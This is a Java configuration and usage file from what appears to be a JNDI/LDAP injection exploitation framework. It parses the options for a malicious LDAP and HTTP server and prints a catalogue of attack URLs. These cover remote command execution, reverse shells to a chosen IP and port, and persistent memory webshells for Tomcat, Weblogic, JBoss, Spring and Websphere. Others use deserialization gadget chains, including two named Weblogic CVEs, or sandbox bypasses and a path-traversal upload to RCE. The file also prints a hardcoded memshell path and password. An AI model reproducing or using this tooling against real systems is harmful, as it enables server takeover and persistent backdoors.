package com.idiot9.ldap.utils;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.Parameter;
import com.beust.jcommander.UnixStyleUsageFormatter;
import com.idiot9.ldap.enumtypes.ConsoleColor;
import com.idiot9.ldap.enumtypes.EncodingTypes;
import com.idiot9.ldap.gadgets.GadgetFactory;
import org.reflections.Reflections;

import java.util.*;

//参数解析
public class Config {
    public static String codebase;

    @Parameter(names = {"-u", "--usage"}, description = "show available gadgets")
    public static boolean usage;

    @Parameter(names = {"-i", "--ip"}, description = "your listen ip", order = 1)
    public static String ip;

    @Parameter(names = {"-p", "--httpport"}, description = "your http port", order = 1)
    public static int httpport = 2345;

    @Parameter(names = {"-l", "--ldapport"}, description = "your ladp port", order = 1)
    public static int ldapport = 1389;

    @Parameter(names = {"-g", "--gadget"}, description = "choose gadget name", order = 2)
    public static String gadget;

    @Parameter(names = {"-c", "--cmd"}, description = "cmd you want to execute", order = 2)
    public static String cmd = "calc";

    @Parameter(names = {"-e", "--encode"}, description = "choose encode pattern | support: bin,base64,base64url,hex", order = 2)
    public static String encode = "bin";

    @Parameter(names = {"-m", "--memshell"}, description = "generate memshell", order = 3)
    public static String mem;

    @Parameter(names = {"-k", "--key"}, description = "key of memshell like ?cmd=", order = 3)
    public static String password = "cmd";

    @Parameter(names = {"-h", "--help"}, description = "show helps", help = true)
    public static boolean help = false;

    public Config() {
    }

    public static void applyArgs(String[] agrs){
        JCommander jc = JCommander.newBuilder().addObject(new Config()).build();

//        try{
//            jc.parse(agrs);
//        }catch(Exception e){
//            System.out.print("");
//            help = true;
//        }
        jc.parse(agrs);
        if (ip == null && gadget == null){
            System.out.println(ConsoleColor.RED + "you must choose one param within '-i, -g'\n" + ConsoleColor.RESET);
            help = true;
        }

        codebase = "http://" + ip + ":" + httpport + "/";

        if (usage){
            Reflections.log = null;
            final List<Class<? extends GadgetFactory>> payloadClasses =
                    new ArrayList<Class<? extends GadgetFactory>>(GadgetFactory.Utils.getPayloadClasses());
            //按字母排序
            Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

            final List<String[]> rows = new LinkedList<String[]>();

            for (Class<? extends GadgetFactory> payloadClass : payloadClasses) {
                rows.add(new String[] {
                        payloadClass.getSimpleName(),
                });

                //解析表格，就是对String[]进行排版
                final List<String> lines = Strings.formatTable(rows);
                System.out.println("Supported Gadgets:");
                for (String line : lines) {
                    System.err.println("     " + line);
                }

                System.out.println("Supported LADP Queries：");
                System.out.println("* all words are case INSENSITIVE when send to ldap server");
                String prefix = "ldap://" + Config.ip + ":" + Config.ldapport + "/";
                System.out.println("\n[+] Basic Queries: " + prefix + "Basic/[PayloadType]/[Params], e.g.");
                System.out.println("    " + prefix + "Basic/Dnslog/[domain]");
                System.out.println("    " + prefix + "Basic/Command/[cmd]");
                System.out.println("    " + prefix + "Basic/Command/Base64/[base64_encoded_cmd]");
                System.out.println("    " + prefix + "Basic/ReverseShell/[ip]/[port]  ---windows NOT supported");
                System.out.println("    " + prefix + "Basic/TomcatEcho");
                System.out.println("    " + prefix + "Basic/SpringEcho");
                System.out.println("    " + prefix + "Basic/WeblogicEcho");
                System.out.println("    " + prefix + "Basic/TomcatMemshell1");
                System.out.println("    " + prefix + "Basic/TomcatMemshell2  ---need extra header [shell: true]");
//            System.out.println("    " + prefix + "Basic/TomcatMemshell3");
                System.out.println("    " + prefix + "Basic/JettyMemshell");
                System.out.println("    " + prefix + "Basic/WeblogicMemshell1");
                System.out.println("    " + prefix + "Basic/WeblogicMemshell2");
                System.out.println("    " + prefix + "Basic/JBossMemshell");
                System.out.println("    " + prefix + "Basic/WebsphereMemshell");
                System.out.println("    " + prefix + "Basic/SpringMemshell");
                System.out.println("    " + prefix + "Basic/SpringInterceptorShell/[key]");

                System.out.println("\n[+] Deserialize Queries: " + prefix + "Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.");
                System.out.println("    " + prefix + "Deserialization/URLDNS/[domain]");
                System.out.println("    " + prefix + "Deserialization/CommonsCollectionsK1/Dnslog/[domain]");
                System.out.println("    " + prefix + "Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]");
                System.out.println("    " + prefix + "Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported");
                System.out.println("    " + prefix + "Deserialization/CommonsBeanutils2/TomcatEcho");
                System.out.println("    " + prefix + "Deserialization/C3P0/SpringEcho");
                System.out.println("    " + prefix + "Deserialization/Jdk7u21/WeblogicEcho");
                System.out.println("    " + prefix + "Deserialization/Jre8u20/TomcatMemshell");
                System.out.println("    " + prefix + "Deserialization/CVE_2020_2555/WeblogicMemshell1");
                System.out.println("    " + prefix + "Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells");

                System.out.println("\n[+] TomcatBypass Queries");
                System.out.println("    " + prefix + "TomcatBypass/Dnslog/[domain]");
                System.out.println("    " + prefix + "TomcatBypass/Command/[cmd]");
                System.out.println("    " + prefix + "TomcatBypass/Command/Base64/[base64_encoded_cmd]");
                System.out.println("    " + prefix + "TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported");
                System.out.println("    " + prefix + "TomcatBypass/TomcatEcho");
                System.out.println("    " + prefix + "TomcatBypass/SpringEcho");
                System.out.println("    " + prefix + "TomcatBypass/TomcatMemshell1");
                System.out.println("    " + prefix + "TomcatBypass/TomcatMemshell2  ---need extra header [shell: true]");
                System.out.println("    " + prefix + "TomcatBypass/TomcatMemshell3  /ateam  pass1024");
                System.out.println("    " + prefix + "TomcatBypass/SpringMemshell");

                System.out.println("\n[+] GroovyBypass Queries");
                System.out.println("    " + prefix + "GroovyBypass/Command/[cmd]");
                System.out.println("    " + prefix + "GroovyBypass/Command/Base64/[base64_encoded_cmd]");

                System.out.println("\n[+] WebsphereBypass Queries");
                System.out.println("    " + prefix + "WebsphereBypass/List/file=[file or directory]");
                System.out.println("    " + prefix + "WebsphereBypass/Upload/Dnslog/[domain]");
                System.out.println("    " + prefix + "WebsphereBypass/Upload/Command/[cmd]");
                System.out.println("    " + prefix + "WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]");
                System.out.println("    " + prefix + "WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported");
                System.out.println("    " + prefix + "WebsphereBypass/Upload/WebsphereMemshell");
                System.out.println("    " + prefix + "WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp");

                System.exit(0);
            }



        }

        jc.setProgramName("java -jar test.jar");
        jc.setUsageFormatter(new UnixStyleUsageFormatter(jc));

        if(help) {
            jc.usage(); //if -h specified, show help and exit
            System.exit(0);
        }

    }
}
